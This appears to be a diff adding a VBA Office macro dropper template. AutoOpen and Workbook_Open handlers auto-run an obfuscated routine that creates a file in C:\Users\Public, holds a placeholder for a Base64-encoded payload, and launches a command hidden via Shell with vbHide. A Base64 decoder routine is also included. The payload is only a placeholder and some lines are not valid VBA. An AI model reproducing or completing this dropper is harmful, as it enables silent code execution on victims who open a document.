@@ -1,6 +1,93 @@
-Dim myFSO as New FileSystemObject
-Dim myStream As TextStream
-Dim fileName = "C:\Users\Public\temp.cs"
-Set myStream = myFSO.CreateTextFile(fileName, True)
+Sub iDn()
+  Dim nLJ6tv
+  Dim myFSO as New FileSystemObject
+  Dim myStream As TextStream
+  Dim fileName = "C:\Users\Public\temp.cs"
+  Set myStream = myFSO.CreateTextFile(fileName, True)
+  'stream.Write Base64Decode($$$ENCODED$$$)
+  Call Shell(nLJ6tv, vbHide)
+End Sub
+Sub AutoOpen()
+  iDn
+End Sub
+Sub Workbook_Open()
+  iDn
+End Sub
 
-$$$ENCODED$$$
+Option Explicit
+
+Private Const clOneMask = 16515072          '000000 111111 111111 111111
+Private Const clTwoMask = 258048            '111111 000000 111111 111111
+Private Const clThreeMask = 4032            '111111 111111 000000 111111
+Private Const clFourMask = 63               '111111 111111 111111 000000
+
+Private Const clHighMask = 16711680         '11111111 00000000 00000000
+Private Const clMidMask = 65280             '00000000 11111111 00000000
+Private Const clLowMask = 255               '00000000 00000000 11111111
+
+Private Const cl2Exp18 = 262144             '2 to the 18th power
+Private Const cl2Exp12 = 4096               '2 to the 12th
+Private Const cl2Exp6 = 64                  '2 to the 6th
+Private Const cl2Exp8 = 256                 '2 to the 8th
+Private Const cl2Exp16 = 65536              '2 to the 16th
+
+Public Function Decode64(sString As String) As String
+
+    Dim bOut() As Byte, bIn() As Byte, bTrans(255) As Byte, lPowers6(63) As Long, lPowers12(63) As Long
+    Dim lPowers18(63) As Long, lQuad As Long, iPad As Integer, lChar As Long, lPos As Long, sOut As String
+    Dim lTemp As Long
+
+    sString = Replace(sString, vbCr, vbNullString)      'Get rid of the vbCrLfs.  These could be in...
+    sString = Replace(sString, vbLf, vbNullString)      'either order.
+
+    lTemp = Len(sString) Mod 4                          'Test for valid input.
+    If lTemp Then
+        Call Err.Raise(vbObjectError, "MyDecode", "Input string is not valid Base64.")
+    End If
+
+    If InStrRev(sString, "==") Then                     'InStrRev is faster when you know it's at the end.
+        iPad = 2                                        'Note:  These translate to 0, so you can leave them...
+    ElseIf InStrRev(sString, "=") Then                  'in the string and just resize the output.
+        iPad = 1
+    End If
+
+    For lTemp = 0 To 255                                'Fill the translation table.
+        Select Case lTemp
+            Case 65 To 90
+                bTrans(lTemp) = lTemp - 65              'A - Z
+            Case 97 To 122
+                bTrans(lTemp) = lTemp - 71              'a - z
+            Case 48 To 57
+                bTrans(lTemp) = lTemp + 4               '1 - 0
+            Case 43
+                bTrans(lTemp) = 62                      'Chr(43) = "+"
+            Case 47
+                bTrans(lTemp) = 63                      'Chr(47) = "/"
+        End Select
+    Next lTemp
+
+    For lTemp = 0 To 63                                 'Fill the 2^6, 2^12, and 2^18 lookup tables.
+        lPowers6(lTemp) = lTemp * cl2Exp6
+        lPowers12(lTemp) = lTemp * cl2Exp12
+        lPowers18(lTemp) = lTemp * cl2Exp18
+    Next lTemp
+
+    bIn = StrConv(sString, vbFromUnicode)               'Load the input byte array.
+    ReDim bOut((((UBound(bIn) + 1) \ 4) * 3) - 1)       'Prepare the output buffer.
+
+    For lChar = 0 To UBound(bIn) Step 4
+        lQuad = lPowers18(bTrans(bIn(lChar))) + lPowers12(bTrans(bIn(lChar + 1))) + _
+                lPowers6(bTrans(bIn(lChar + 2))) + bTrans(bIn(lChar + 3))           'Rebuild the bits.
+        lTemp = lQuad And clHighMask                    'Mask for the first byte
+        bOut(lPos) = lTemp \ cl2Exp16                   'Shift it down
+        lTemp = lQuad And clMidMask                     'Mask for the second byte
+        bOut(lPos + 1) = lTemp \ cl2Exp8                'Shift it down
+        bOut(lPos + 2) = lQuad And clLowMask            'Mask for the third byte
+        lPos = lPos + 3
+    Next lChar
+
+    sOut = StrConv(bOut, vbUnicode)                     'Convert back to a string.
+    If iPad Then sOut = Left$(sOut, Len(sOut) - iPad)   'Chop off any extra bytes.
+    Decode64 = sOut
+
+End Function
